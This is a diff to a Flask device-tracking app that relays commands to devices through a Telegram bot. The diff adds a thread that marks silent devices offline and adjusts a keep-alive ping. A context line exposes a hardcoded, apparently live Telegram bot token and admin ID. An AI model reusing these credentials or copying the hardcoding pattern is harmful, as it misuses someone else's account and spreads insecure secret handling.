@@ -4,7 +4,7 @@ import json
 import requests
 import threading
 import time
-from datetime import datetime
+from datetime import datetime, timedelta
 import os
 
 app = Flask(__name__, instance_path='/tmp/instance')
@@ -56,7 +56,7 @@ def update_device():
     
     c.execute('''INSERT OR REPLACE INTO devices (id, name, model, status, battery, ip, last_seen)
                  VALUES (?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)''',
-              (data['id'], data['name'], data['model'], data.get('status', 'online'), data.get('battery', 0), data.get('ip', '')))
+              (data['id'], data['name'], data['model'], 'online', data.get('battery', 0), data.get('ip', '')))
     conn.commit()
     conn.close()
     return 'OK'
@@ -67,7 +67,6 @@ def send_command():
     device_id = data.get('deviceId')
     command = data.get('command')
     
-    # Отправляем команду в Telegram бота
     try:
         token = "8876390846:AAELEYzUJAUpH3ysUeOO9IdMMBy3mKYzxig"
         admin_id = "6178711912"
@@ -79,14 +78,34 @@ def send_command():
     
     return jsonify({"status": "ok"})
 
-# Авто-пинг
+# ===== АВТОМАТИЧЕСКИЙ ПЕРЕВОД В ОФФЛАЙН (НО НЕ УДАЛЕНИЕ) =====
+def check_offline():
+    with app.app_context():
+        while True:
+            try:
+                conn = sqlite3.connect(DB_PATH)
+                c = conn.cursor()
+                # Если устройство не обновлялось больше 5 минут → оффлайн
+                five_min_ago = datetime.now() - timedelta(minutes=5)
+                c.execute('''UPDATE devices 
+                             SET status = 'offline' 
+                             WHERE status = 'online' 
+                             AND last_seen < ?''', (five_min_ago,))
+                conn.commit()
+                conn.close()
+            except Exception as e:
+                print(f"❌ Ошибка: {e}")
+            time.sleep(60)
+
+threading.Thread(target=check_offline, daemon=True).start()
+
+# ===== АВТО-ПИНГ (Render не уснёт) =====
 def keep_alive():
     with app.app_context():
         while True:
             try:
                 url = f"http://localhost:{os.environ.get('PORT', 5000)}/api/devices"
                 requests.get(url, timeout=5)
-                print(f"✅ Пинг в {datetime.now()}")
             except:
                 pass
             time.sleep(600)
